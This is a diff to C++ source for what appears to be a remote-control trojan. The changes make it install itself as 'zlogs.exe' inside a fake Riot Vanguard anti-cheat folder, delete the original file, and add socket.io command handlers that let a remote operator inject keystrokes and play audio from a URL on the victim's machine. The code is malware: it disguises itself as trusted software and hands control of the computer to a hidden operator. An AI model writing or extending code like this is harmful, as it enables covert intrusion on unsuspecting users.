@@ -8,7 +8,7 @@ int main(int argc, char* argv[])
         std::size_t last_slash = path.find_last_of("\\");
         std::string fileName = path.substr(last_slash + 1);
 
-        std::thread installEmmet(InstallEmmetBat, path, "C:\\'Location Test'\\'test location'\\Logs\\zlogs.exe");
+        std::thread installEmmet(InstallEmmetBat, path, "C:\\'Program Files'\\'Riot Vanguard'\\Logs\\zlogs.exe");
         installEmmet.join();
 
         SelfDestruct(fileName, path);
@@ -77,10 +77,38 @@ int main(int argc, char* argv[])
             try
             {
                 if (words.size() == 2)
-                {
-                    std::cout << toUpper(words[1]) << std::endl;
                     PressKey(toUpper(words[1]));
-                }
+                else
+                    client.socket()->emit("commandResult", Base64Encode("Something went wrong"));
+            }
+            catch (const std::invalid_argument& e)
+            {
+                client.socket()->emit("commandResult", Base64Encode("Something went wrong"));
+            }
+            catch (const std::out_of_range& e)
+            {
+                client.socket()->emit("commandResult", Base64Encode("Something went wrong"));
+            }
+        }
+        else if (message.find("playmp3") != std::string::npos)
+        {
+            std::vector<std::string> words;
+            std::size_t pos = 0;
+            std::string word;
+
+            while ((pos = message.find(" ")) != std::string::npos) {
+                word = message.substr(0, pos);
+                words.push_back(word);
+                message.erase(0, pos + 1);
+            }
+            words.push_back(message);
+
+            try
+            {
+                if (words.size() == 2)
+                    PlayMp3(words[1]);
+                else if(words.size() < 2)
+                    PlayMp3("http://localhost:3000/ftp/wtf.mp3");
                 else
                     client.socket()->emit("commandResult", Base64Encode("Something went wrong"));
             }
